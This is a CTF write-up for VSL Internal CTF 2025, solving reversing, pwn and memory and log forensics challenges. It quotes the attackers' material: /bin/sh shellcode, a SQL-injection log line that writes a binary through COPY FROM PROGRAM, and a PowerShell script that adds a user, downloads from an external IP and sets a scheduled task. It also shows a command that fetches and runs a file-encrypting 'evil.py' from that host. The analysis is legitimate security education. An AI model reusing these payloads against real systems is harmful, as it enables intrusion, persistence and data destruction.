---
title:  VSL Internal CTF 2025
published: 2025-01-12
description:  VSL Internal CTF 2025 with HISC (HCMUTE Information Security Club)
tags: [CTFs, DFIR, RE]
category: CTFs Write-up
draft: false
---

# VSL Internal CTF 2025

![image](https://hackmd.io/_uploads/Bkzd7-WwJg.png)

---

## Reverse Engineering
### EasyXor

![image](https://hackmd.io/_uploads/BJIWVZbwkx.png)

```!
flag.txt: 0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310
```
The challenge gave out an apk file, so lets decompressed it back to jar first by using [dex2jar](https://github.com/pxb1988/dex2jar) 

![image](https://hackmd.io/_uploads/BJP7S-Zv1g.png)

after getting the jar file, extract it using [jd-gui](https://java-decompiler.github.io/)

we got the password by debase64 the string inside leanhtruong.j4f package and the whole encryption process also in there just different class

![image](https://hackmd.io/_uploads/rJ-ASZWPyl.png)

![image](https://hackmd.io/_uploads/ryIuLZbvyg.png)

```py!
def xor_decrypt(encrypted_hex: str, key: str) -> str:
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    key_bytes = key.encode('utf-8')
    decrypted_bytes = bytearray(len(encrypted_bytes))
    for i in range(len(encrypted_bytes)):
        decrypted_bytes[i] = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)]
    return decrypted_bytes.decode('utf-8')

encrypted_hex = "0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310134c4b6231206514161037563c361a081815132206515d0018195b0b55312a2601472675220310"
key = "VKU Security Lab - VSL"  #VktVIFNlY3VyaXR5IExhYiAtIFZTTA debase64
print(xor_decrypt(encrypted_hex, key))
```

![image](https://hackmd.io/_uploads/SyRUv--PJl.png)


## PWN
### asm-machine

![image](https://hackmd.io/_uploads/HkEjvW-vkl.png)

This challeng just simply about writing a shellcode, here is the shellcode:

```asm!
section .data
    sh db '/bin/sh', 0           

section .text
global _start

_start:
    xor eax, eax                 
    push eax                     
    push 0x68732f2f              
    push 0x6e69622f              
    mov ebx, esp                 

    xor ecx, ecx                 
    xor edx, edx                 
    mov al, 11                   
    int 0x80                     
end
```
![image](https://hackmd.io/_uploads/Sk9BOWbDJe.png)

## Forensics
### Easy Log

![image](https://hackmd.io/_uploads/Syj3dZZwyx.png)

We have received a log file from a website that has been attacked with account&password bruteforcing.

![image](https://hackmd.io/_uploads/SkizK-Wwkx.png)

But after the attacker succeeded in bruteforcing and logged in, they started to do something weird

```
192.168.25.1 - - [11/Jan/2025 02:53:26] "GET http://secret.vsl.com.vn/user?id=1;COPY%20binary%20FROM%20PROGRAM%20%27echo%200200000006000000e02d000000000000%20%3E%3E%20binary%27 HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
```

After noticing this, I quickly wrote a script and dump all the thing that the attack request to the server thats contains ```COPY%20binary%20FROM%20PROGRAM%20%27echo%```
script:
```py!
import re
import binascii

def convert(log_file, output_file):
    with open(log_file, 'r') as file:
        logs = file.readlines()

    converted_lines = []
    for log in logs:
        match = re.search(r"COPY%20binary%20FROM%20PROGRAM%20%27echo%20([0-9a-fA-F]+)%20", log)
        if match:
            binary_data = match.group(1)
            try:
                data = binascii.unhexlify(binary_data).decode('utf-8', errors='replace')
                converted_lines.append(data)
            except:
                pass


    with open(output_file, 'w') as file:
        file.write("\n".join(converted_lines))


log_file = 'evidence-log.txt'
output_file = 'lmao.txt'
convert(log_file, output_file)
```
and found out that, its an ELF

![image](https://hackmd.io/_uploads/HJoRq-bw1x.png)

compiled and string to get the flag

![image](https://hackmd.io/_uploads/HywvoZbw1g.png)

### 4 parts

![image](https://hackmd.io/_uploads/B1misWbDyx.png)

The first thing I saw after checking the raw file with volatility is a readme.png and secret.txt.txt.vsl

![image](https://hackmd.io/_uploads/HkAphZZwyl.png)

we got the 4th part of the flag and a string after convert the txt file from hex

```
IVBIfZrJtEPpPiwA2b8mQQ7wKvgbKngklrJtcrX2CiJwWF5szQOK5D7E9qL+OgoE5h8nXO4DEgKeCrYoFzCMfpwfP89Z94c+gh34vRGPrq31dQDMUA+C6yK+8ukp+CHx
```

Let's continue investigating, I also found out that there a powershell process, I immediately start searching for a ps1 script and envtually found it, there 2 ways of finding this, the first one is by searching for ps1 after dump and string the powershell process, second is to use volatility(not the volatility3)

![image](https://hackmd.io/_uploads/BJm8pWZwkg.png)

I will be showing the volatility(not the volatility3) from now on, since it's needed for the next part

![image](https://hackmd.io/_uploads/SJE8AbWDJx.png)

we can see here a script that got download and seem like it's encoded in base64, decode it gave us the ps1 script that I mentioned above

![image](https://hackmd.io/_uploads/HyzEAWbDJg.png)

![image](https://hackmd.io/_uploads/S1vhCZbP1x.png)

```ps1!
$Username = "hello"
$Password = "hellokitty"
$ImagePath = "C:\Users\Public\Pictures\background.png"
$ImageUrl = "http://61.14.233.104:7331/hacked.png"
$Part2 = "pp3n3d_1ns1"

Invoke-Expression -Command "net user $Username $Password /add"
Invoke-Expression -Command "net localgroup Users $Username /add"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($ImageUrl, $ImagePath)

$Script = @"
Add-Type -TypeDefinition `
'using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}'

[Wallpaper]::SystemParametersInfo(20, 0, `"$ImagePath`", 0x01 | 0x02);
"@

# [System.Environment]::SetEnvironmentVariable('secret_pass', '<redacted>', [System.EnvironmentVariableTarget]::User) # Do something with bg image

Set-Content -Path "C:\Users\Public\Documents\Set-Wallpaper.ps1" -Value $Script

$schTaskCommand = "schtasks /create /tn 'changewall' /tr 'powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\Set-Wallpaper.ps1' /sc ONLOGON /ru $Username"
Invoke-Expression -Command $schTaskCommand
```

Okay so, we got the 2nd part of the flag ```$Part2 = "pp3n3d_1ns1"```, also if you noticed there some secret code that got set as an envar, using envar plugin we can get this value back, it's ```y0un3v3rf1ndm3kkk@@```

![image](https://hackmd.io/_uploads/H1nvJfWwyl.png)

**If you notice again, the link to the picture that the attacker used, but don't know why this link is hacked.png and there another script but with bg.jpg**

![image](https://hackmd.io/_uploads/rkoDgGbwyl.png)

using steghide with the secret password you can get the part 3 of the flag, also if you wonder how to find this version of the script, I already said above, string the whole powershell process and search for it

![image](https://hackmd.io/_uploads/SJuzbMbPJg.png)

Okay now we only need part 1 left, get back to the consoles dump from volatility

![image](https://hackmd.io/_uploads/HySi-GbPyl.png)

we saw here is the attacker ran a script and encrypt the secret.txt, if you scroll a bit higher you can see the whole script, its AES

```!
PS C:\Users\admin\Desktop\ImportantDocuments> python -c "from requests import get; print(get('http://61.14.233.104:7331/
evil.py').text)"                                                                                                        
import os                                                                                                               
import base64                                                                                                           
from Crypto.Cipher import AES                                                                                           
from Crypto.Protocol.KDF import scrypt                                                                                  
from Crypto.Util.Padding import pad                                                                                     
from Crypto.Random import get_random_bytes                                                                              
                                                                                                                        
password = input("Enter the password: ")                                                                                
salt = get_random_bytes(16)                                                                                             
key = scrypt(password, salt, key_len=32, N=16384, r=8, p=1)                                                             
cipher = AES.new(key, AES.MODE_CBC)                                                                                     
                                                                                                                        
directory = os.getcwd()                                                                                                 
                                                                                                                        
for filename in os.listdir(directory):                                                                                  
    file_path = os.path.join(directory, filename)                                                                       
    if os.path.isfile(file_path) and not filename.endswith('.vsl'):                                                     
        with open(file_path, 'rb') as file:                                                                             
            file_data = file.read()                                                                                     
                                                                                                                        
        encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))                                                 
        encrypted_data_b64 = base64.b64encode(salt + cipher.iv + encrypted_data)                                        
                                                                                                                        
        with open(file_path + '.vsl', 'wb') as file:                                                                    
            file.write(encrypted_data_b64)                                                                              
        os.remove(file_path)                                                                                            
        print("File has been encrypted and saved as " + file_path + ".vsl")                                             
                                                                                                                        
PS C:\Users\admin\Desktop\ImportantDocuments> notepad evil.py
```

if you wonder what is the key, its an input argument

![image](https://hackmd.io/_uploads/HkBrzGZwke.png)

so lets just decrypt this, here the script:

```py!
import os
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from Crypto.Util.Padding import unpad

password = "benjaminbunny"
directory = os.getcwd()

for filename in os.listdir(directory):
    file_path = os.path.join(directory, filename)
    if os.path.isfile(file_path) and filename.endswith('.vsl'):
        with open(file_path, 'rb') as file:
            encrypted_data_b64 = file.read()
        encrypted_data = base64.b64decode(encrypted_data_b64)
        salt = encrypted_data[:16]
        iv = encrypted_data[16:32]
        encrypted_content = encrypted_data[32:]
        key = scrypt(password, salt, key_len=32, N=16384, r=8, p=1)
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_content), AES.block_size)
        original_file_path = file_path[:-4]
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)

        os.remove(file_path)
```
and part 1 is ```VSL{wh4t_h4 ```

**full flag: VSL{wh4t_h4pp3n3d_1ns1d3_my_l4pt0p_@^@omg@@}**

**First Blood hehe**

![image](https://hackmd.io/_uploads/ryR-mMbvkl.png)

---
![wallpaper](https://hackmd.io/_uploads/HkRNXMWP1g.jpg)
